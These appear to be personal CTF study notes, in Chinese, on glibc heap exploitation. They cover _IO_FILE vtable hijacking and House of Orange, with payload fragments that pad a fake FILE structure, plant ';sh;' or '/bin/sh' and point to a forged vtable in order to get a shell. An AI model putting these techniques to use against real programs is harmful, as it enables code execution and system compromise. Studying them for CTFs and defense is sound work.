Linux

路径： /proc/self/maps  -> mmap



我们写的数据都在data段上，位置已知，也可以控制，所以在io_file,会把fp改为在data段上的位置

p stdout	

p ((struct _IO_FILE_plus *)0x7fd921608620).vtable

flag 动到它了可能会出问题

(调试下，flag为A的时候，不会出现问题)

buf = code + 0x202040

lock = buf + 0x500

vtable_addr = buf + 0x188

payload = "A"*8 + ";sh;aaaa" + "A"*0x78 + p64(lock) (不动flag,直接用分号的方式把binsh塞进去)

(payload = "/bin/sh\x00" + "A" * 0x78 + p64(lock)

payload = payload.ljust(0xd8,"A") + p64(vtable_addr)

## House of Orange

io_file + unsorted bin attack 组合



1. 我们要泄露libc的位置，才能利用unsorted bin attack 去改掉 _IO_list_all
2. free 的位置要找一个已知位置去构造vtable
3. 构造的东西在heap上，所以也要知道heap位置。





负数用十六进制表示与二进制类似

即补码的方式

3 ： 0003（十六进制） 3求反 -> C，再 + 1 -> D  --> -3 :  FFFD





IO_flush_all_luckp 它呼叫vtable 检查 与flag无关，所以flag位置直接填 /bin/sh\x00





vtable 在更新版本有保护， 非法直接abort 必须在 io_vtable_section 范围里面  